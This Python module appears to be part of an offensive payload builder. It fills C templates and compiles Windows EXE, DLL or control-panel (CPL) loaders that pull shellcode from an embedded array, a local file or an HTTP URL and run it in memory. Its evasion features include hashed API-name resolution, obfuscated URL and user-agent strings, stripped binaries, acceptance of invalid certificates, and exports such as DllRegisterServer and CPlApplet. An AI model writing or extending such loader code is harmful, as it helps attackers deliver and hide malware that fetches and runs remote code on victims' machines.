import os
import subprocess
import sys
import uuid
import importlib
import random
from jinja2 import Environment, FileSystemLoader

def _djb2_hash(s):
    """Calculates the DJB2 hash for a given string."""
    hash_val = 5381
    for char in s:
        hash_val = ((hash_val << 5) + hash_val) + ord(char)
    return hash_val & 0xFFFFFFFF # Return as a 32-bit unsigned integer

def _obfuscate_string(string_data, key):
    """Obfuscates a string using a byte-wise subtraction and returns a C-style byte array."""
    if not string_data:
        return ""
    obfuscated_bytes = bytearray()
    for char in string_data.encode('utf-8'):
        obfuscated_bytes.append((char - key) & 0xFF)
    return ", ".join([f"0x{byte:02x}" for byte in obfuscated_bytes])

def _get_api_hashes():
    """Returns a dictionary of all required API name hashes."""
    api_names = [
        "LoadLibraryA", "VirtualAlloc", "CreateThread", "WaitForSingleObject",
        "CloseHandle", "CreateFileMappingW", "MapViewOfFile", "GetProcessHeap",
        "RtlAllocateHeap", "HeapFree", "CreateFileA", "GetFileSize", "ReadFile",
        "RtlMoveMemory", "CreateDecompressor", "Decompress", "CloseDecompressor",
        "WinHttpOpen", "WinHttpConnect", "WinHttpOpenRequest", "WinHttpSendRequest",
        "WinHttpReceiveResponse", "WinHttpQueryDataAvailable", "WinHttpReadData",
        "WinHttpCloseHandle", "WinHttpCrackUrl", "WinHttpSetOption", "WinHttpQueryHeaders"
    ]
    module_names = ["KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL", "WINHTTP.DLL"]
    
    hashes = {}
    for name in api_names:
        hashes[f"hash_{name.lower()}"] = _djb2_hash(name)
    for name in module_names:
        key_name = name.replace('.', '_').lower()
        hashes[f"hash_{key_name}"] = _djb2_hash(name)
        
    return hashes

def _build_compiler_command(options, temp_c_filename, temp_def_filename, output_artifact_filename):
    """A helper function to build the GCC compiler command list."""
    command = ["x86_64-w64-mingw32-gcc", "-O2"]

    if options.get('debug_mode') != 'true':
        command.append("-s")

    output_format = options.get('output_format', 'exe')
    if output_format in ['dll', 'cpl']:
        command.extend(["-shared", "-fvisibility=hidden", "-lkernel32"])
        if output_format == 'cpl':
            command.append("-lshell32")
        if temp_def_filename:
            command.append(temp_def_filename)

    command.extend([temp_c_filename, "-o", output_artifact_filename])
    
    return command

def encode(input_filepath, original_filename, options):
    """
    Dynamically generates and compiles a C program from user choices.
    """
    print(f"INFO: Starting Windows C embedder with options: {options}")
    
    temp_files_to_clean = []
    try:
        template_dir = os.path.join(os.path.dirname(__file__), 'templates')
        env = Environment(loader=FileSystemLoader(template_dir), trim_blocks=True, lstrip_blocks=True)
        template = env.get_template('base.c.j2')

        template_vars = {}
        
        api_resolver_choice = options.get('api_resolver', 'string')
        template_vars['api_resolver'] = api_resolver_choice
        template_vars['api_resolver_partial'] = f"partials/api_resolver_{api_resolver_choice}.c.j2"
        if api_resolver_choice == 'hashed':
            template_vars.update(_get_api_hashes())

        data_source_choice = options.get('data_source', 'embedded')
        template_vars['data_source'] = data_source_choice
        template_vars['data_source_partial'] = f"partials/datasource_{data_source_choice}.c.j2"
        obfuscate_strings = options.get('obfuscate_strings') == 'true'
        template_vars['obfuscate_strings'] = obfuscate_strings

        if data_source_choice == 'file':
            template_vars['file_path'] = options.get('file_path', '').replace('\\', '\\\\')
            template_vars['bytecode_array'] = ""
        elif data_source_choice == 'http':
            url = options.get('url', '')
            user_agent = options.get('user_agent', 'Mozilla/5.0')
            if obfuscate_strings:
                key = random.randint(1, 255)
                template_vars['obfuscation_key'] = key
                template_vars['url_obfuscated'] = _obfuscate_string(url, key)
                template_vars['user_agent_obfuscated'] = _obfuscate_string(user_agent, key)
            else:
                template_vars['url'] = url.replace('\\', '\\\\')
                template_vars['user_agent'] = user_agent
            template_vars['trust_invalid_cert'] = 1 if options.get('trust_invalid_cert') == 'true' else 0
            template_vars['bytecode_array'] = ""
        else: # embedded
            with open(input_filepath, "rb") as f:
                bytecode_to_embed = f.read()
            template_vars['bytecode_array'] = ", ".join([f"0x{byte:02x}" for byte in bytecode_to_embed])

        output_format = options.get('output_format', 'exe')
        export_name = 'CPlApplet' if output_format == 'cpl' else options.get('export_name', 'DllRegisterServer')
        
        template_vars.update({
            'allocation_partial': f"partials/alloc_{options.get('allocation_method', 'virtualalloc')}.c.j2",
            'execution_partial': f"partials/exec_{options.get('execution_method', 'newthread')}.c.j2",
            'output_format': output_format,
            'export_name': export_name,
            'debug_mode': (options.get('debug_mode') == 'true'),
            'bytecode_transformation': options.get('bytecode_encoding'),
            'bytecode_compression': options.get('bytecode_compression')
        })

        c_source_code = template.render(**template_vars)

        temp_c_filename = f"{uuid.uuid4()}.c"
        temp_c_filepath = os.path.join('/tmp/uploads', temp_c_filename)
        temp_files_to_clean.append(temp_c_filepath)
        with open(temp_c_filepath, "w") as f:
            f.write(c_source_code)

        temp_def_filename = None
        if output_format in ['dll', 'cpl']:
            def_content = f"EXPORTS\n    {export_name}"
            temp_def_filename = f"{uuid.uuid4()}.def"
            temp_def_filepath = os.path.join('/tmp/uploads', temp_def_filename)
            temp_files_to_clean.append(temp_def_filepath)
            with open(temp_def_filepath, "w") as f_def:
                f_def.write(def_content)

        base_name, _ = os.path.splitext(original_filename)
        output_artifact_filename = f"{base_name}.{output_format}"
        
        compiler_command = _build_compiler_command(
            options, temp_c_filename, temp_def_filename, output_artifact_filename
        )

        print(f"INFO: Compiling with command: {' '.join(compiler_command)}")
        subprocess.run(
            compiler_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads'
        )
        print(f"INFO: Compilation successful. Artifact: {output_artifact_filename}")

        return output_artifact_filename

    except subprocess.CalledProcessError as e:
        print(f"ERROR: Compilation failed. Stderr: {e.stderr}", file=sys.stderr)
        raise Exception(f"C compilation failed: {e.stderr}")
    finally:
        for f_path in temp_files_to_clean:
            if os.path.exists(f_path):
                os.remove(f_path)
